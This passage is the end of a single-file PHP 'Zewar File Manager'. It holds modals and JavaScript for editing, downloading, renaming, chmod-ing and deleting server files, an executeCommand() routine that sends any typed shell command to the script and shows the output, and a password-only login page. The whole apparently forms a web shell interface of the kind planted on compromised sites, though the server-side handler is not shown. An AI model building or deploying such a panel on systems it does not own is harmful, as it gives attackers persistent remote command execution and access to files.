        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <input type="hidden" name="item" id="delete_item">
            <div class="modal-body">
                <p>Are you sure you want to delete <strong id="delete_name"></strong>?</p>
                <p style="color:#dc3545; font-size:0.8rem; margin-top:10px;">⚠ This action cannot be undone!</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button>
                <button type="submit" name="delete" class="btn btn-danger">Delete Permanently</button>
            </div>
        </form>
    </div>
</div>

<script>
function showToast(message, type) {
    let toast = document.createElement('div');
    toast.className = 'toast ' + type;
    toast.innerHTML = message;
    document.body.appendChild(toast);
    setTimeout(function() { toast.remove(); }, 3000);
}

function showModal(id) {
    document.getElementById(id).classList.add('active');
}

function closeModal(id) {
    document.getElementById(id).classList.remove('active');
}

function editFile(encodedName) {
    window.location.href = '?edit=' + encodedName + '&d=<?php echo base64_encode($current); ?>';
}

function downloadFile(encodedPath, filename) {
    window.location.href = '?download=' + encodedPath + '&filename=' + encodeURIComponent(filename);
}

function renameItem(name) {
    document.getElementById('rename_old').value = name;
    document.getElementById('rename_current').value = name;
    document.getElementById('rename_new').value = name;
    showModal('renameModal');
}

function chmodItem(name, currentPerm) {
    document.getElementById('chmod_item').value = name;
    document.getElementById('chmod_filename').value = name;
    document.getElementById('chmod_perm').value = currentPerm;
    showModal('chmodModal');
}

function deleteItem(name) {
    document.getElementById('delete_item').value = name;
    document.getElementById('delete_name').innerText = name;
    showModal('deleteModal');
}

function executeCommand() {
    var cmdInput = document.getElementById('cmd_input');
    var cmdOutput = document.getElementById('cmd_output');
    var command = cmdInput.value.trim();
    
    if (!command) {
        showToast('Please enter a command', 'error');
        return;
    }
    
    cmdOutput.innerHTML = 'Executing command...';
    cmdOutput.classList.add('active');
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '?ajax_cmd=1&t=' + Date.now(), true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.status === 'success') {
                        cmdOutput.innerHTML = '$ ' + command + '\n' + (data.output || 'Command executed successfully');
                        cmdInput.value = '';
                        showToast('Command executed', 'success');
                    } else {
                        cmdOutput.innerHTML = 'Error: ' + data.output;
                        showToast('Command failed', 'error');
                    }
                } catch(e) {
                    cmdOutput.innerHTML = 'Error parsing response';
                    showToast('Error parsing response', 'error');
                }
            } else {
                cmdOutput.innerHTML = 'Request failed: ' + xhr.status;
                showToast('Request failed', 'error');
            }
        }
    };
    xhr.send('csrf_token=<?php echo csrf_token(); ?>&command=' + encodeURIComponent(command));
}

document.querySelectorAll('.modal').forEach(function(modal) {
    modal.addEventListener('click', function(e) {
        if (e.target === this) {
            this.classList.remove('active');
        }
    });
});

<?php if ($message): ?>
document.addEventListener('DOMContentLoaded', function() {
    showToast('<?php echo addslashes($message); ?>', '<?php echo $toast_type; ?>');
});
<?php endif; ?>
</script>
</body>
</html>
<?php
// Login page function
function get_login_page($error = '') {
    $csrf = csrf_token();
    return '<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Zewar File Manager - Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
                background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .login-container {
                background: #1a1a2e;
                border-radius: 10px;
                border: 1px solid #ffd700;
                padding: 40px;
                width: 100%;
                max-width: 400px;
            }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { font-size: 2rem; color: #ffd700; }
            .logo p { color: #aaa; font-size: 0.8rem; margin-top: 5px; }
            .input-group { margin-bottom: 20px; }
            .input-group label { display: block; color: #ffd700; margin-bottom: 8px; font-size: 0.85rem; }
            .input-group input {
                width: 100%;
                padding: 12px 15px;
                background: #0a0a0a;
                border: 1px solid #ffd700;
                border-radius: 5px;
                color: #fff;
                font-size: 1rem;
            }
            .input-group input:focus { outline: none; border-color: #ffed4a; }
            .btn-login {
                width: 100%;
                padding: 12px;
                background: #ffd700;
                border: none;
                border-radius: 5px;
                color: #000;
                font-weight: 600;
                font-size: 1rem;
                cursor: pointer;
            }
            .btn-login:hover { background: #ffed4a; }
            .error {
                background: rgba(220,53,69,0.2);
                border-left: 4px solid #dc3545;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                color: #ff6b6b;
                font-size: 0.85rem;
            }
            .footer { text-align: center; margin-top: 20px; color: #666; font-size: 0.7rem; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <h1>📁 Zewar File Manager</h1>
                <p>Secure Access Required</p>
            </div>
            ' . ($error ? '<div class="error">⚠ ' . htmlspecialchars($error) . '</div>' : '') . '
            <form method="post">
                <input type="hidden" name="csrf_token" value="' . $csrf . '">
                <div class="input-group">
                    <label>🔒 Password</label>
                    <input type="password" name="password" placeholder="Enter password" autofocus required>
                </div>
                <button type="submit" class="btn-login">🔐 Login</button>
            </form>
            <div class="footer">🛡 Secure Connection</div>
        </div>
    </body>
    </html>';
}
?>
